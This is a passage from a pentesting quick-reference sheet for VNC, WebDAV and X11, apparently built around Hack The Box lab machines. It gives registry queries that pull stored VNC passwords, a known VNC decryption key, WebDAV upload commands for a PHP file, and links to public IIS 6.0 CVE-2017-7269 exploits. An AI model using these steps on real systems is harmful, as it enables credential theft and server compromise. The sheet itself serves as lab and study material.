    reg QUERY HKLM\SOFTWARE\RealVNC\vncserver
    reg QUERY HKCU\Software\TightVNC\Server
    reg QUERY HKLM\SOFTWARE\RealVNC\vncserver
    reg QUERY HKLM\SOFTWARE\RealVNC\vncserver
    ```
- Description key: `0x238210763578887`
- Connect over SSH tunnel
    ```bash
    ssh -L5901:127.0.0.1:5901 charix@10.10.10.84
    vncviewer 127.0.0.1::5901
    vncviewer 127.0.0.1::5901​ -passwd​ secret
    ```

**Tools**
**Hardening**
**References**

## WebDev

**Quick Reference**

- Check Capabilities: `davtest -url http://grandpa.htb/`
- Interact
  - Command-line WebDAV client for Unix: <http://www.webdav.org/cadaver/>
  - Commands: <https://www.systutorials.com/docs/linux/man/1-cadaver/>
  - `cadaver http://10.10.10.15`
- Upload file: `curl --upload-file ./example.php --user user:password http://<ip>/webdav_url`
- Exploits:
  - IIS 6.0 in Microsoft Windows Server 2003 R2 (CVE-2017-7269): iis_webdav_scstoragepathfromurl
      - <https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl>
      - <https://github.com/edwardz246003/IIS_exploit>
      - <https://blog.0patch.com/2017/03/0patching-immortal-cve-2017-7269.html>
      - <https://github.com/gottburgm/Exploits/blob/master/CVE-2017-7269/CVE_2017_7269.pl>
  - IIS 6.0

**Tools**
**Hardening**
**References**

## X11 - 6000/tcp

**Quick Reference**

- Configuration files
    ```bash
    /etc/Xn.hosts
    /usr/lib/X11/xdm
    Search through all files for the command "xhost +" or "/usr/bin/X11/xhost +"

    /usr/lib/X11/xdm/xsession
    /usr/lib/X11/xdm/xsession-remote
    /usr/lib/X11/xdm/xsession.0
    /usr/lib/X11/xdm/xdm-config
    DisplayManager*authorize:on
    ```

**Tools**
**Hardening**
**References**
